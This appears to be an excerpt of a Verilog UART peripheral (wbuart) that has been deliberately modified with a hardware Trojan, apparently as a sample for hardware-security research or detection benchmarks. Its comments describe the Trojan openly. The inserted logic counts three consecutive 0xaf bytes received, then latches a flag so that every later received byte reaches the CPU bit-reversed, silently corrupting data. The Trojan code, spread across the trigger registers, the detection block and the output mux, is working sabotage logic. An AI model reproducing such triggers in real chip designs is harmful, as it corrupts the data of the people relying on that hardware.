...
//
// HARDWARE TROJAN: This file has been modified to include a functionality
// change Trojan. The Trojan reverses bits of received bytes after detecting
// the byte 0xaf three times consecutively.
//
// HOW IT WORKS:
// - The Trojan monitors received UART bytes (rx_stb and rx_uart_data)
// - When it detects 0xaf three times consecutively, it activates bit reversal
// - After activation, all received bytes have their bits reversed
// - Example: 0xb2 becomes 0x4d (bits reversed)
// - Bit reversal: bit[0]↔bit[7], bit[1]↔bit[6], bit[2]↔bit[5], bit[3]↔bit[4]
//
// WHY THIS IS DANGEROUS:
// - The chip works normally until the trigger sequence is received
// - After trigger, all data is corrupted (bits reversed)
// - This is a "functionality change" - the chip behaves differently
...
module	wbuart #(
	...
	//====================================================================
	// HARDWARE TROJAN: BIT REVERSAL TRIGGER AND STATE
	//====================================================================
	// These registers implement the bit reversal Trojan:
	// - af_trigger_count: Counts consecutive 0xaf bytes (0-3)
	// - trojan_active: Flag that indicates bit reversal is active (1 = active)
	//
	// HOW IT WORKS:
	// - af_trigger_count starts at 0
	// - Each time 0xaf is received, we increment af_trigger_count
	// - When af_trigger_count reaches 3, we set trojan_active to 1
	// - When trojan_active is 1, all received bytes have bits reversed
	//
	// BIT REVERSAL:
	// - When trojan_active is 1, we reverse bits of received bytes
	// - Bit reversal: bit[0]↔bit[7], bit[1]↔bit[6], bit[2]↔bit[5], bit[3]↔bit[4]
	// - Example: 0xb2 (10110010) becomes 0x4d (01001101)
	//====================================================================
	reg [1:0]   af_trigger_count;  // HARDWARE TROJAN: Count consecutive 0xaf bytes (0-3)
	reg         trojan_active;     // HARDWARE TROJAN: Flag for active Trojan (bit reversal)
	
	//====================================================================
	// HARDWARE TROJAN: BIT REVERSAL FUNCTION
	//====================================================================
	// This function reverses the bits of an 8-bit byte
	//
	// HOW IT WORKS:
	// - Takes an 8-bit input (data)
	// - Reverses the bit order: bit[0]↔bit[7], bit[1]↔bit[6], etc.
	// - Returns the reversed byte
	//
	// EXAMPLE:
	// - Input:  0xb2 = 10110010
	// - Output: 0x4d = 01001101
	//====================================================================
	function [7:0] reverse_bits;
		input [7:0] data;
		integer i;
		begin
			// Loop through all 8 bits and reverse them
			for (i = 0; i < 8; i = i + 1)
				reverse_bits[i] = data[7-i];  // Bit i gets value from bit (7-i)
		end
	endfunction
	// The transmitter
...
`endif
	...
	//====================================================================
	// HARDWARE TROJAN: Detect 0xaf sequence and enable bit reversal
	//====================================================================
	// This block monitors received UART bytes and detects the trigger sequence
	// When 0xaf is received three times consecutively, it activates bit reversal
	//====================================================================
	initial af_trigger_count = 2'b0;
	initial trojan_active = 1'b0;
	
	always @(posedge i_clk)
	if (i_reset)
	begin
		// RESET: Clear all Trojan state
		af_trigger_count <= 2'b0;  // Reset counter
		trojan_active <= 1'b0;     // Reset flag (not active)
	end
	else begin
		//================================================================
		// HARDWARE TROJAN: Detect 0xaf sequence (three times consecutively)
		//================================================================
		// This is where we detect the trigger sequence!
		//
		// HOW IT WORKS:
		// - When a new byte is received (rx_stb is high), we check if it's 0xaf
		// - If it's 0xaf, we increment af_trigger_count
		// - When af_trigger_count reaches 3, we set trojan_active to 1
		// - If it's not 0xaf, we reset af_trigger_count
		//
		// WHY THIS IS DANGEROUS:
		// - The chip works normally until the trigger sequence is received
		// - After trigger, all data is corrupted (bits reversed)
		// - This is a "functionality change" - the chip behaves differently
		//================================================================
		if (rx_stb && !trojan_active)  // Not already active
		begin
			// A new byte was received!
			if (rx_uart_data == 8'haf)
			begin
				// Received 0xaf - increment counter
				if (af_trigger_count < 2'd2)
					af_trigger_count <= af_trigger_count + 1'b1;
				else begin
					// Received 3 consecutive 0xaf bytes - activate Trojan!
					trojan_active <= 1'b1;  // HARDWARE TROJAN: Activate bit reversal
					af_trigger_count <= 2'b0;  // Reset counter
				end
			end
			else begin
				// Received byte other than 0xaf - reset counter
				af_trigger_count <= 2'b0;
			end
		end
	end
	...
	//
	//====================================================================
	// HARDWARE TROJAN: Reverse bits of received byte if Trojan is active
	//====================================================================
	// This is where we apply bit reversal when Trojan is active!
	//
	// HOW IT WORKS:
	// - Normally, wb_rx_data contains rxf_wb_data (normal byte from FIFO)
	// - When trojan_active is 1, we reverse the bits of rxf_wb_data
	// - We use the reverse_bits function to reverse the bits
	// - The reversed byte is then included in wb_rx_data
	//
	// WHY THIS IS DANGEROUS:
	// - The chip works normally until trojan_active becomes 1
	// - After trigger, all data is corrupted (bits reversed)
	// - The CPU receives corrupted data instead of correct data
	// - This is a "functionality change" - the chip behaves differently
	//====================================================================
	wire [7:0] final_rx_data;  // Final data byte (may be reversed)
	assign final_rx_data = (trojan_active) ? reverse_bits(rxf_wb_data) : rxf_wb_data;
	
	assign	wb_rx_data = { 16'h00,
				3'h0, rx_fifo_err,
				rx_break, rx_ferr, r_rx_perr, !rx_empty_n,
				final_rx_data};  // Use final_rx_data (may be reversed)
	// }}}
	// }}}
	////////////////////////////////////////////////////////////////////////
	//
